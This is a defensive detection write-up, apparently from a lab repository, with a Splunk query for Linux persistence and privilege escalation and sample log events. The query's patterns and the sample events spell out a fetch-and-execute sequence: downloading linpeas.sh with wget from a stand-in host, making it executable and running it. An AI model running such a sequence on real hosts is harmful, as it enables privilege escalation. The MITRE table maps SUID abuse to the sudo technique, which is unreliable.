
# Detection Use Case: Linux Privilege Escalation & Persistence via Service, Cron, and Suspicious Binary Execution

## Scenario Description
Attackers aiming for persistence and privilege escalation on a Linux host often modify system services, cron jobs, or copy binaries to sensitive locations with elevated permissions (e.g., SUID bits). They may also execute privilege escalation enumeration tools like **linPEAS** or abuse tools like **pkexec** and GTFOBins.

This detection focuses on:
- Modifications to systemd service files or cron jobs
- Setting SUID bits on binaries
- Copying suspicious binaries into system executable paths
- Execution of linPEAS and other enumeration tools
- Usage of privilege escalation helper binaries (e.g., pkexec)
- GTFOBins exploitation patterns

---

## Objective
Detect potential privilege escalation and persistence attempts by monitoring suspicious command executions and file modifications related to Linux system services, cron jobs, and binaries.

---

## Tools Used
- **SIEM:** Splunk Enterprise
- **Log Sources:** Linux Syslog containing detailed process command lines and execution context

---

## Lab Setup
- Kali Linux VM running with Splunk Universal Forwarder forwarding syslog
- Splunk Enterprise hosted on a centralized logging server

---

## Data Source Mapping

| Field              | Example Value                      | Description                                  |
|--------------------|----------------------------------|----------------------------------------------|
| `_time`            | 2025-05-27 14:05:00              | Timestamp of the event                        |
| `host`             | kali                             | Hostname where the event was logged          |
| `User`             | root                             | User executing the command                    |
| `Image`            | /usr/bin/chmod                   | Binary executed                              |
| `CommandLine`      | chmod +x /lib/systemd/system/test.service | Full executed command line                  |
| `CurrentDirectory` | /lib/systemd/system              | Directory context of the execution            |
| `action_type`      | Modified Service File (echo)     | Categorized action derived from command line |
| `attack_type`      | Persistence via Service/Cron     | High-level attack category                     |
| `detection_type`   | System File Abuse or PE Attempt  | Type of detection                              |

---

## 🔎 SPL Query

```spl
index=linux_logs sourcetype=syslog ("systemd/system" OR "/etc/crontab" OR "/etc/cron." OR "/lib/systemd/system" OR "/usr/bin" OR "/usr/local/bin" OR "/bin" OR "/sbin" OR "pkexec" OR "LFILE=" OR "linpeas.sh" OR "wget" OR "curl")
| rex field=_raw "<Data Name=\"Image\">(?<Image>[^\<]+)</Data>"
| rex field=_raw "<Data Name=\"CommandLine\">(?<CommandLine>[^\<]+)</Data>"
| rex field=_raw "<Data Name=\"CurrentDirectory\">(?<CurrentDirectory>[^\<]+)</Data>"
| rex field=_raw "<Data Name=\"User\">(?<User>[^\<]+)</Data>"
| rex field=_raw "<Data Name=\"UtcTime\">(?<UtcTime>[^\<]+)</Data>"
| eval _time=strptime(UtcTime, "%Y-%m-%d %H:%M:%S.%3N")
| eval action_type=case(
    match(Image, "chmod") AND match(CurrentDirectory, "systemd|cron"), "Made Service Executable",
    match(CommandLine, "echo.*\.service.*>.*systemd"), "Modified Service File (echo)",
    match(CommandLine, "echo.*cron") OR match(CurrentDirectory, "/etc/cron."), "Modified Cron Job",
    match(CommandLine, "touch .*\.service") OR match(CommandLine, "nano .*\.service") OR match(CommandLine, "vi .*\.service"), "Created or Edited Service File",
    match(CommandLine, "chmod.*[ ]+[+]?4[0-7][0-7]") AND (match(CommandLine, "/usr/") OR match(CommandLine, "/bin") OR match(CommandLine, "/sbin")), "Set SUID Bit on Binary",
    match(CommandLine, "cp .* /usr/bin") OR match(CommandLine, "mv .* /usr/bin"), "Suspicious Binary Copied to SUID Path",
    match(CommandLine, "pkexec"), "pkexec Executed - Potential PrivEsc",
    match(CommandLine, "LFILE="), "GTFOBins Pattern Detected (LFILE variable)",
    match(CommandLine, "wget.*linpeas\.sh") OR match(CommandLine, "curl.*linpeas\.sh"), "Downloaded linPEAS",
    match(CommandLine, "chmod\s\+x\s.*linpeas\.sh"), "Made linPEAS Executable",
    match(CommandLine, "./linpeas\.sh"), "Executed linPEAS"
)
| where isnotnull(action_type)
| bin _time span=2m
| stats values(User) as User values(Image) as Image values(CommandLine) as CommandLine values(CurrentDirectory) as CurrentDirectory values(action_type) as action_type by _time, host
| eval attack_type=case(
    match(mvjoin(action_type, " "), "Service|Cron"), "Persistence via Service/Cron",
    match(mvjoin(action_type, " "), "SUID"), "SUID Abuse for Privilege Escalation",
    match(mvjoin(action_type, " "), "Binary Copied"), "Potential Privilege Escalation",
    match(mvjoin(action_type, " "), "pkexec"), "Privilege Escalation Attempt",
    match(mvjoin(action_type, " "), "GTFOBins"), "GTFOBins Exploitation Attempt",
    mvcount(action_type) >= 2, "linPEAS Execution Step",
    true(), "Other"
)
| eval detection_type=if(attack_type=="linPEAS Execution Step", "Privilege Escalation Enumeration", "System File Abuse or PE Attempt")
| table _time host User Image CommandLine CurrentDirectory action_type attack_type detection_type
```

---

## Alert
![Screenshot 2025-05-29 190421](https://github.com/user-attachments/assets/dd2c4f20-1c68-4cb0-ad5c-2b255ca62ea8)


## Log / Sample Event
| Time               | Host | User | Image        | CommandLine                                      | CurrentDirectory       | Action Type                   | Attack Type                     | Detection Type                    |
|--------------------|------|------|--------------|-------------------------------------------------|------------------------|------------------------------|---------------------------------|---------------------------------|
| 2025-05-27 14:05:00 | kali | root | /usr/bin/chmod | chmod +x /lib/systemd/system/test.service        | /lib/systemd/system     | Made Service Executable       | Persistence via Service/Cron    | System File Abuse or PE Attempt  |
| 2025-05-27 14:06:10 | kali | root | /usr/bin/wget  | wget http://example.com/linpeas.sh                | /root                   | Downloaded linPEAS            | linPEAS Execution Step          | Privilege Escalation Enumeration |
| 2025-05-27 14:07:15 | kali | root | /usr/bin/chmod | chmod +x linpeas.sh                               | /root                   | Made linPEAS Executable       | linPEAS Execution Step          | Privilege Escalation Enumeration |
| 2025-05-27 14:08:00 | kali | root | ./linpeas.sh   | ./linpeas.sh                                     | /root                   | Executed linPEAS              | linPEAS Execution Step          | Privilege Escalation Enumeration |

---

## ✅ Detection Status
Tested and verified in a Kali Linux lab environment with Splunk Universal Forwarder and Splunk Enterprise.

---

## 🧠 Analyst Notes / Recommendations
- Review service and cron modifications for legitimacy.
- Investigate SUID bit changes and suspicious binary placements.
- Track usage of pkexec and GTFOBins related commands.
- Monitor linPEAS downloads and executions closely as enumeration tools are common precursors to escalation.
- Be aware of false positives from legitimate admin operations or automated deployment scripts.

---

## 🔗 MITRE ATT&CK Mapping

| Technique ID | Technique Name                        | Description                                  |
|--------------|-------------------------------------|----------------------------------------------|
| T1543        | Create or Modify System Process     | Modifying systemd service files or cron jobs |
| T1548.002    | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Setting SUID bits for privilege escalation    |
| T1059.004    | Command and Scripting Interpreter: Unix Shell | Execution of shell scripts and enumeration tools |
| T1068        | Exploitation for Privilege Escalation | Using pkexec or other binaries to escalate privileges |

